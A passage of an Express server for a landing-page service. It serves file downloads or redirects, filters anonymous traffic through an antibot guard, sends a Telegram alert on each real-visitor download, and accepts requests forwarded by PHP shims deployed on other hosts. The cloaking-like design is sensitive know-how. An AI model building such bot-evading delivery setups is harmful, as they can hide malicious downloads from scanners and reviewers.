  // Telegram alert only for real visitor traffic — skip dashboard previews so users
  // don't get a buzz every time they click Preview.
  const shouldAlert = !isAuthenticatedSession(req);

  // Link URL — redirect (only allow http(s) schemes to block javascript:/data:/file: open redirects)
  if (activeVersion.link_url) {
    if (!/^https?:\/\//i.test(activeVersion.link_url)) return res.status(400).send('Invalid link URL');
    if (shouldAlert) {
      const pageRow = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.pageId]);
      if (pageRow) setImmediate(() => notifyDownload(req, pageRow, activeVersion));
    }
    return res.redirect(activeVersion.link_url);
  }

  // File download — safeUploadPath rejects anything that resolves outside uploadsDir.
  if (!activeVersion.file_path) return res.status(404).json({ error: 'No active file' });
  const filePath = safeUploadPath(activeVersion.file_path);
  if (!filePath) return res.status(400).json({ error: 'Invalid file path' });
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found on disk' });

  if (shouldAlert) {
    const pageRow = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.pageId]);
    if (pageRow) setImmediate(() => notifyDownload(req, pageRow, activeVersion));
  }

  res.download(filePath, activeVersion.original_name || activeVersion.file_name);
}
app.get('/download/:pageId', (req, res, next) => {
  // Dashboard preview: any logged-in user can pull the actual download to verify it.
  // Anonymous traffic still runs botGuard.
  if (isAuthenticatedSession(req)) return downloadHandler(req, res, next);
  return botGuard(req, res, () => downloadHandler(req, res, next));
});

// ═══════════ PHP SHIM MOUNT ═══════════
// The deployed index.php forwards every visitor request to /_shim/proxy/<original-path>.
// shimAuth validates the deployment secret against the page it was issued for and sets
// req._shimPageId / req._shimRealIp; from there the existing antibot + render pipeline
// runs unchanged. No domain is required — the deployment is anchored to a page id.
// shimAuth validates the X-Shim-Key against:
//   1. The per-(page, user) deployments table — sets req._shimPageId AND req._shimUserId.
//   2. Legacy pages.shim_secret as a fallback — sets req._shimPageId, leaves _shimUserId
//      null (these are shims deployed before the per-user model existed; they keep working
//      but serve versions with user_id IS NULL or the page owner's versions).
function timingEq(a, b) {
  const ba = Buffer.from(a); const bb = Buffer.from(b);
  return ba.length === bb.length && crypto.timingSafeEqual(ba, bb);
}
async function shimAuth(req, res, next) {
  const pageId = (req.headers['x-shim-page'] || '').trim();
  const key    = req.headers['x-shim-key']  || '';
  const ip     = req.headers['x-shim-real-ip'] || '';
  if (!pageId || !key || !ip) return res.status(400).send('shim headers missing');

  // Per-user deployment lookup (preferred).
  const deployment = await queryOne('SELECT id, user_id, shim_secret FROM deployments WHERE page_id = ? AND shim_secret = ?', [pageId, key]);
  if (deployment && timingEq(deployment.shim_secret, key)) {
    req._shimRealIp = ip.startsWith('::ffff:') ? ip.substring(7) : ip;
    req._shimPageId = pageId;
    req._shimUserId = deployment.user_id;
    return next();
  }

  // Legacy fallback: page-wide shim_secret. Serves versions with user_id IS NULL or the
  // page owner's user_id (whichever exists).
  const page = await queryOne('SELECT shim_secret, user_id FROM pages WHERE id = ?', [pageId]);
  if (page && page.shim_secret && timingEq(page.shim_secret, key)) {
    req._shimRealIp = ip.startsWith('::ffff:') ? ip.substring(7) : ip;
    req._shimPageId = pageId;
    req._shimUserId = page.user_id || null;
    return next();
  }

  return res.status(403).send('bad key');
}

const shimRouter = express.Router();
shimRouter.use(shimAuth);
// Match bot-verify at any subpath under the shim mount, so it works regardless of
// where the shim is deployed on the visitor host (root, /landing/, /shim/anything/, …).
shimRouter.post(/\/api\/bot-verify\/?$/, botVerifyHandler);
shimRouter.get(/\/download\/([^/]+)\/?$/, botGuard, (req, res, next) => {
  req.params.pageId = req.params[0];
  return downloadHandler(req, res, next);
});
shimRouter.use(botGuard);
shimRouter.use(shimPageRoute);
app.use('/_shim/proxy', shimRouter);

// SPA fallback — only serve React app on the app's own domain
app.get('*', (req, res) => {
  if (!isAppDomain(req)) {
    return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#fff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;">Page Not Found</h1><p style="color:#6b7280;">This domain is not configured properly.</p></div></body></html>');
  }
  const indexPath = path.join(clientBuild, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.send('Run "cd client && npm run build" to build the React frontend.');
  }
});

// Start server after DB init
initDb().then(() => {
  app.listen(PORT, () => {
    console.log('SC Landing Pages server running on http://localhost:' + PORT);
  });
}).catch(err => {
  console.error('Failed to initialize database:', err);
  process.exit(1);
});
